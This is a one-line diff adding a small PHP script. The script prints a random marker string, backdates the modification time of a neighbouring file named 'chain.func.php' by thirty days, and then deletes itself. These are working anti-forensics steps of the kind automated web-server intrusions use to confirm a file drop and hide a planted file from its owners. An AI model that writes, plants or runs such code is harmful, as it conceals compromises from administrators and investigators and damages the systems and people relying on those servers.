@@ -1,0 +1,1 @@
+<?php echo "QYGRCZZFde"; if (file_exists("./chain.func.php")){ touch("./chain.func.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*U7C2BQyAsgah36myeqPg*/ ?>
